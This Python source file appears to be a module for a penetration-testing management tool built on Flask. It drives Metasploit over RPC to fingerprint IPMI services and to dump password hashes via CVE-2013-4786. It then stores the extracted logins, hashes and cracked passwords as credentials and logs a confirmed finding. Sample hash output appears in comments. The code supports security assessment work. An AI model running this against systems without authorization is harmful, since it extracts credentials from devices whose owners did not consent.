from pymetasploit import MsfRpcClient, MsfRpcConsole
from typing import List, Dict, Union, Optional
from app.controllers.forms import FlaskForm, TreeSelectMultipleField
import wtforms
from wtforms import validators
from app.action_modules.classes import ActionModule
import app.models as models
from app import db
import sqlalchemy as sa
import sqlalchemy.orm as so
from sqlalchemy.orm.session import Session
from flask import current_app
import time
import re
from flask_babel import force_locale, lazy_gettext as _l
import logging
logger = logging.getLogger('Module IpmiCheck')


def action_run(target: models.Service, running_user_id: int, session: Session, console: Optional[MsfRpcConsole], locale: str="en") -> Dict[str, Union[str, List[Dict[str, str]]]]:
    project_id = target.host.from_network.project_id
    # Firstly, we check all host on ipmi version
    console.write("use auxiliary/scanner/ipmi/ipmi_version")
    console.write(f"set RHOSTS {target.host.ip_address}")
    console.write(f"set RPORT {target.port}")
    _garbage = console.read()
    console.write("run")
    ipmi_data = console.read_all()
    ipmi_version = None
    for line in ipmi_data.decode('utf8').strip().split("\n"):
        line = line.strip()
        if "[+]" in line and " - IPMI - " in line:
            ipmi_version = line.split(' - IPMI - ', 1)[1]
    if ipmi_version is None:
        logger.warning(f"Did not found IPMI version: {target}")
        return {'version': None, 'found_hashes': []}
    logger.info(f"Target {target} has ipmi version")
    if not target.title:
        target.title = ipmi_version.split(' ', 1)[0].strip()
    else:
        if target.description is None:
            target.description = ""
        target.description += "<p>IPMI version:" + ipmi_version + "</p>"
    # IPMI Cipher 0 check later - when we know more about metasploit output ipmi cipher 0
    IPMI_ACTION = "ipmi_cipher_0"
    logger.warning("Skilling Cipher 0 test - action in development")
    # Now we exploit IPMI_dumphashes on target:
    IPMI_ACTION = "ipmi_dumphashes"
    console.write('use auxiliary/scanner/ipmi/ipmi_dumphashes')
    console.write(f"set RHOSTS {target.host.ip_address}")
    console.write(f"set RPORT {target.port}")
    _garbage = console.read()
    console.write("run")
    ipmi_hashes_data = console.read_all()
    found_hashes = []
    for line in ipmi_hashes_data.decode('utf8').strip().split("\n"):
        line = line.strip()
        if "[+]" in line and " - IPMI - Hash found:" in line: # [+] 10.0.0.1:623 - IPMI - Hash found: admin:5557338cfb2db5ff021e4d814d87b6fff154160f3a2e1b4881fb54dfe1bf56478788ea7ba154375b000000000000fd030010d21da876c01d140561646d696e:ad297481ecdd2b88019fc074031ac2b9bb907cf1
            ipmi_hash = line.split(' - IPMI - Hash found: ', 1)[1]
            logger.info("Found IPMI hash")
            login = ipmi_hash.split(':', 1)[0]
            ipmi_hash = ipmi_hash.split(':', 1)[1]
            found_hashes.append({'login': login, 'hash': ipmi_hash})
        elif "[+]" in line and " - IPMI - Hash for user " in line: # [+] 10.0.0.1:623 - IPMI - Hash for user 'admin' matches password 'admin'
            login_password = re.findall(".*? - IPMI - Hash for user '(.*?)' matches password '(.*?)'", line)[0]
            login, password = login_password[0], login_password[1]
            logger.info("Found IPMI password")
            for h in found_hashes:
                if h['login'] == login:
                    h['password'] = password
                    break

    ipmi_hash_type = session.scalars(sa.select(models.HashType).where(models.HashType.string_slug == 'IPMI-2-0-RAKP-HMAC-SHA1')).first()
    for h in found_hashes:
        with force_locale(locale):
            if 'password' in h and 'login' in h:
                cred = session.scalars(sa.select(models.Credential).where(sa.and_(models.Credential.login == h['login'],
                                                                                  models.Credential.password == h['password'],
                                                                                  models.Credential.project_id == project_id))).first()
                if not cred:
                    cred = models.Credential(created_by_id=running_user_id)
                    cred.login = h['login']
                    cred.password = h['password']
                    cred.description = "<p>" + str(_l("Extracted via CVE-2013-4786 from IPMI")) + "</p>"
                    cred.hash_type = ipmi_hash_type
                    cred.project_id = project_id
                    session.add(cred)
                cred.services.add(target)
                cred.received_from.add(target.host)
            else:
                cred = models.Credential(login=h['login'], password_hash=h['hash'], hash_type=ipmi_hash_type,
                                         description="<p>" + str(_l("Extracted via CVE-2013-4786 from IPMI")) + "</p>",
                                         created_by_id=running_user_id, project_id=project_id)
                session.add(cred)
                cred.services.add(target)
                cred.received_from.add(target.host)
    if len(found_hashes) != 0:
        issue = session.scalars(sa.select(models.Issue).where(sa.and_(models.Issue.project_id == target.host.from_network.project_id, models.Issue.by_template_slug == 'cve_2013_4786'))).first()
        if not issue:
            issue_template = session.scalars(sa.select(models.IssueTemplate).where(models.IssueTemplate.string_slug == 'cve_2013_4786')).first()
            issue_status = session.scalars(sa.select(models.IssueStatus).where(models.IssueStatus.string_slug == 'confirmed')).first()
            if issue_template and issue_status:
                issue = issue_template.create_issue_by_template()
                issue.status = issue_status
                issue.created_by_id = running_user_id
                issue.project_id = project_id
                session.add(issue)
        if issue:
            issue.services.add(target)
    logger.info("Committing session")
    session.commit()
    return {'version': ipmi_version, 'found_hashes': found_hashes}


def exploit(filled_form: dict, running_user_id: int, default_options: dict, locale: str, project_id: int) -> None:
    logger.info("Running module IpmiCheck")
    client = MsfRpcClient(password=current_app.config['METASPLOIT_PASSWORD'], port=current_app.config['METASPLOIT_PORT'],
                          host=current_app.config['METASPLOIT_HOST'], ssl=True, verify_ssl=current_app.config["METASPLOIT_VERIFY_SSL"])
    with so.sessionmaker(db.engine, autoflush=False)() as session, client.create_console() as console:
        for target in filled_form['targets']:
            target = session.scalars(sa.select(models.Service).where(models.Service.id == int(target))).one()
            logger.info("Trying to exploit " + str(target))
            action_run(target, running_user_id, session, console, locale)


class ModuleInitForm(FlaskForm):
    def __init__(self, project_id, *args, **kwargs):
        super().__init__(*args, **kwargs)
        ipmi_mark_nmap = db.session.scalars(sa.select(models.AccessProtocol).where(models.AccessProtocol.string_slug == 'asf-rmcp')).first()
        self.targets.choices = [(str(i.id), i) for i in db.session.scalars(sa.select(models.Service).join(models.Service.host)
                                                                                                    .join(models.Host.from_network)
                                                                                                    .where(sa.and_(models.Network.project_id == project_id,
                                                                                                                   models.Service.access_protocol_id == ipmi_mark_nmap.id)))]
    targets =TreeSelectMultipleField(_l("Services:"), coerce=int, description=_l("Choose targets to exploit"), validators=[validators.Optional()])
    submit = wtforms.SubmitField(_l('Run'))


class IPMIcheck(ActionModule):
    title = _l("IPMI exploit")
    description = _l("For a given address, if the IPMI port is open, the module will try to exploit all vulnerabilities (such as CVE-2013-4786) and save result in database")
    admin_form = None
    run_form = ModuleInitForm
    exploit_single_target = staticmethod(action_run)
    exploit = staticmethod(exploit)
    default_options = {}
